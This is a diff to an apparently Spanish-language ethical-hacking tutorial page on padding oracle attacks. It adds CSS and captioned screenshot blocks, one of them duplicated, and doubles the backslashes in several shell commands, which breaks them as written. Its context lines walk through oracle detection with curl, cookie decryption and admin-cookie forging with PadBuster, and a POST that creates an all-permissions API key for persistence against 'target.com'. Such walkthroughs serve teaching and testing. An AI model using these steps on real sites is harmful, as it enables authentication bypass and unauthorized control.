@@ -80,6 +80,74 @@
 
         .footer { text-align: center; padding: 3rem 0 2rem; border-top: 1px solid var(--border-color); margin-top: 4rem; color: var(--text-muted); }
 
+        /* Modern Image Containers */
+        .image-showcase {
+            display: grid;
+            gap: 2rem;
+            margin: 3rem 0;
+            padding: 2rem;
+            background: rgba(26, 26, 26, 0.9);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2), inset 0 0 20px rgba(0, 255, 136, 0.05);
+        }
+
+        .image-container {
+            position: relative;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.4s ease;
+            overflow: hidden;
+        }
+
+        .image-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+            border-color: var(--primary-color);
+        }
+
+        .image-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+            animation: scanLine 3s infinite;
+        }
+
+        @keyframes scanLine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        .image-container:hover img {
+            transform: scale(1.02);
+            border-color: var(--primary-color);
+        }
+
+        .image-caption {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            background: rgba(0, 255, 136, 0.05);
+            border-left: 3px solid var(--primary-color);
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            line-height: 1.4;
+            border-radius: 0 4px 4px 0;
+        }
+
         @media (max-width: 768px) { .container { padding: 1rem; } h1 { font-size: 2.2rem; } .logo-matrix { width: 100px; height: 100px; font-size: 1.5rem; } .crypto-flow { grid-template-columns: 1fr; } }
     </style>
 </head>
@@ -226,6 +294,15 @@ cookie_original="YWRtaW4%3D%7C1234567890abcdef"
 curl -b "session=$cookie_original" http://target.com/admin
 curl -b "session=${cookie_original}XX" http://target.com/admin</code>
                     </div>
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-13.png" alt="Padding Oracle detection">
+                            <div class="image-caption">
+                                🕵️ <strong>Detección de Oracle:</strong> Comparación de respuestas del servidor mostrando comportamientos diferenciados. Se observa "Padding error" para padding inválido vs "Access denied" para datos inválidos, confirmando la presencia del oracle vulnerable.
+                            </div>
+                        </div>
+                    </div>
+
                     <div class="alert alert-info">
                         <p>Oracle identificado: el servidor devuelve <strong>"Padding error"</strong> vs <strong>"Access denied"</strong> según el tipo de error criptográfico.</p>
                     </div>
@@ -234,10 +311,10 @@ curl -b "session=${cookie_original}XX" http://target.com/admin</code>
                     <div class="code-block">
                         <div class="code-label">Determinación de parámetros</div>
                         <code># Decodificar cookie para análisis
-echo "YWRtaW4%3D%7C1234567890abcdef" | python3 -c \
-  "import urllib.parse, base64, sys; \
-   data=urllib.parse.unquote(sys.stdin.read().strip()); \
-   print('Decoded:', base64.b64decode(data.split('|')[0])); \
+echo "YWRtaW4%3D%7C1234567890abcdef" | python3 -c \\
+  "import urllib.parse, base64, sys; \\
+   data=urllib.parse.unquote(sys.stdin.read().strip()); \\
+   print('Decoded:', base64.b64decode(data.split('|')[0])); \\
    print('Length:', len(base64.b64decode(data.split('|')[1])))"
 
 # Output esperado:
@@ -249,6 +326,15 @@ echo "1234567890abcdef" | xxd
 # 16 bytes = AES-128-CBC probable</code>
                     </div>
 
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-14.png" alt="Cookie structure analysis">
+                            <div class="image-caption">
+                                🔍 <strong>Análisis de Estructura:</strong> Decodificación y análisis de la cookie cifrada mostrando el plaintext "admin" y la longitud del ciphertext de 16 bytes, confirmando AES-128-CBC como algoritmo de cifrado utilizado.
+                            </div>
+                        </div>
+                    </div>
+
                     <h4>Fase 3: Explotación con PadBuster</h4>
                     <div class="code-block">
                         <div class="code-label">Descifrado automatizado</div>
@@ -257,10 +343,10 @@ git clone https://github.com/AonCyberLabs/PadBuster.git
 cd PadBuster
 
 # Descifrado de cookie completa
-perl padBuster.pl http://target.com/admin \
-  "1234567890abcdef" 16 \
-  -cookies "session=YWRtaW4%3D%7C1234567890abcdef" \
-  -encoding 0 \
+perl padBuster.pl http://target.com/admin \\
+  "1234567890abcdef" 16 \\
+  -cookies "session=YWRtaW4%3D%7C1234567890abcdef" \\
+  -encoding 0 \\
   -plaintext
 
 # Parámetros explicados:
@@ -269,6 +355,15 @@ perl padBuster.pl http://target.com/admin \
 # - 16: block size (AES)
 # - -encoding 0: datos en hex
 # - -plaintext: mostrar resultado descifrado</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-15.png" alt="PadBuster execution">
+                            <div class="image-caption">
+                                ⚙️ <strong>PadBuster en Acción:</strong> Ejecución del ataque automatizado mostrando el progreso del descifrado bloque por bloque. Se observa cómo la herramienta explota el oracle para revelar el contenido cifrado de la cookie de sesión.
+                            </div>
+                        </div>
                     </div>
 
                     <div class="code-block">
@@ -327,9 +422,9 @@ print(f"Descifrado: {result}")</code>
                     <div class="code-block">
                         <div class="code-label">Cifrado de datos controlados</div>
                         <code># Generar cookie para usuario administrador
-perl padBuster.pl http://target.com/admin \
-  "1234567890abcdef" 16 \
-  -cookies "session=YWRtaW4%3D%7C1234567890abcdef" \
+perl padBuster.pl http://target.com/admin \\
+  "1234567890abcdef" 16 \\
+  -cookies "session=YWRtaW4%3D%7C1234567890abcdef" \\
   -plaintext "admin|role=admin|timestamp=9999999999"
 
 # Resultado esperado: nuevo ciphertext válido
@@ -341,6 +436,24 @@ new_cookie=$(echo -n "admin" | base64)%7Cabcdef1234567890newciphertextgenerated
 # Test de bypass exitoso
 curl -b "session=$new_cookie" http://target.com/admin 
 # Expected: HTTP 200 "Welcome admin"</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-16.png" alt="Malicious payload generation">
+                            <div class="image-caption">
+                                🔥 <strong>Generación de Payload:</strong> Creación exitosa de una cookie maliciosa con privilegios administrativos. Se muestra cómo PadBuster genera un ciphertext válido para datos controlados, permitiendo escalación de privilegios.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-16.png" alt="Malicious payload generation">
+                            <div class="image-caption">
+                                🔥 <strong>Generación de Payload:</strong> Creación exitosa de una cookie maliciosa con privilegios administrativos. Se muestra cómo PadBuster genera un ciphertext válido para datos controlados, permitiendo escalación de privilegios.
+                            </div>
+                        </div>
                     </div>
 
                     <h4>Fase 5: Explotación Completa y Persistencia</h4>
@@ -362,6 +475,15 @@ curl -b "session=$malicious_cookie" \
      -X POST \
      -d "action=create_api_key&permissions=all" \
      http://target.com/admin/api</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-17.png" alt="Administrative access achieved">
+                            <div class="image-caption">
+                                ✅ <strong>Acceso Administrativo:</strong> Bypass exitoso de autenticación usando la cookie generada maliciosamente. Se observa acceso completo al panel administrativo con capacidades de gestión de usuarios y configuración del sistema.
+                            </div>
+                        </div>
                     </div>
 
                     <div class="alert alert-info">
